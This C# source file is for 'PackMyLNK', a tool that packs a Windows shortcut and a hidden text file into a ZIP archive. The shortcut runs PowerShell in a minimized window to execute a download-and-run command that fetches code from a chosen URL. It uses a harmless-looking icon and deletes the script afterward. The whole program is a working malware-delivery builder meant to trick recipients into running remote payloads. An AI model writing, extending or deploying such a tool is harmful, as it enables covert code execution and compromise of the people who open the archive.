using ICSharpCode.SharpZipLib.Core;
using ICSharpCode.SharpZipLib.Zip;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length < 6)
        {
            Console.WriteLine("Usage: .\\PackMyLNK.exe -Url <URL> -Lnk <LNK_FILE> -Zip <ZIP_file>");
            return;
        }

        string url = null;
        string lnkName = null;
        string zipFile = null;

        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] == "-Url" && i + 1 < args.Length)
            {
                url = args[i + 1];
            }
            else if (args[i] == "-Lnk" && i + 1 < args.Length)
            {
                lnkName = args[i + 1];
            }
            else if (args[i] == "-Zip" && i + 1 < args.Length)
            {
                zipFile = args[i + 1];
            }
        }

        if (url == null || lnkName == null || zipFile == null)
        {
            Console.WriteLine("Usage: .\\PackMyLNK.exe -Url <URL> -Lnk <LNK_FILE> -Zip <ZIP_file>");
            return;
        }

        string curDir = AppDomain.CurrentDomain.BaseDirectory;
        string lnkFilePath = Path.Combine(curDir, lnkName + ".lnk");
        string ps1FilePath = Path.Combine(curDir, lnkName + ".txt");
        string zipFilePath = Path.Combine(curDir, zipFile + ".zip");

        Console.ForegroundColor = ConsoleColor.Cyan;

        Console.WriteLine(@"
  _____           _    __  __       _      _   _ _  __
 |  __ \         | |  |  \/  |     | |    | \ | | |/ /
 | |__) |_ _  ___| | _| \  / |_   _| |    |  \| | ' / 
 |  ___/ _` |/ __| |/ / |\/| | | | | |    | . ` |  <  
 | |  | (_| | (__|   <| |  | | |_| | |____| |\  | . \ 
 |_|   \__,_|\___|_|\_\_|  |_|\__, |______|_| \_|_|\_\
                               __/ |                  
                              |___/                   
 
A simple .zip packer for LNK files - calfcrusher@inventati.org
        ");

        Console.ResetColor();
        Console.WriteLine();
        string psContent = $"Invoke-Expression -Command ([Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri '{url}' -UseBasicParsing).Content))";

        File.WriteAllText(ps1FilePath, psContent);

        SetFileHidden(ps1FilePath);

        CreateShortcut(lnkFilePath, ps1FilePath, lnkName);

        CreateZip(zipFilePath, new[] { lnkFilePath, ps1FilePath });

        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("[+] ZIP file created: " + zipFilePath);
        Console.ResetColor();

        try
        {
            File.Delete(lnkFilePath);
            File.Delete(ps1FilePath);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error deleting files: " + ex.Message);
        }
    }

    static void CreateShortcut(string shortcutPath, string targetFilePath, string lnkName)
    {
        Type shellType = Type.GetTypeFromProgID("WScript.Shell")
                         ?? throw new InvalidOperationException("WScript.Shell is not available.");
        dynamic shell = Activator.CreateInstance(shellType)
                        ?? throw new InvalidOperationException("Failed to create WScript.Shell instance.");

        dynamic shortcut = shell.CreateShortcut(shortcutPath);
        if (shortcut == null) throw new InvalidOperationException("Failed to create shortcut.");

        // Set properties for the shortcut
        shortcut.TargetPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
        shortcut.Arguments = $"Get-Content .\\{lnkName}.txt | Invoke-Expression; Remove-Item -Path '.\\{lnkName}.txt' -Force";
        shortcut.IconLocation = @"C:\Windows\System32\imageres.dll, 3";
        shortcut.WindowStyle = 7;
        shortcut.Save();
    }

    static void CreateZip(string zipFilePath, string[] filesToAdd)
    {
        using (FileStream fsOut = File.Create(zipFilePath))
        using (ZipOutputStream zipStream = new ZipOutputStream(fsOut))
        {
            zipStream.SetLevel(3);

            foreach (string file in filesToAdd)
            {
                FileInfo fi = new FileInfo(file);

                string entryName = ZipEntry.CleanName(fi.Name);
                ZipEntry newEntry = new ZipEntry(entryName)
                {
                    DateTime = fi.LastWriteTime,
                    Size = fi.Length,
                    ExternalFileAttributes = (int)fi.Attributes
                };

                zipStream.PutNextEntry(newEntry);

                using (FileStream fsInput = File.OpenRead(file))
                {
                    byte[] buffer = new byte[4096];
                    StreamUtils.Copy(fsInput, zipStream, buffer);
                }

                zipStream.CloseEntry();
            }
        }
    }

    static void SetFileHidden(string filePath)
    {
        FileAttributes attributes = File.GetAttributes(filePath);
        File.SetAttributes(filePath, attributes | FileAttributes.Hidden);
    }
}
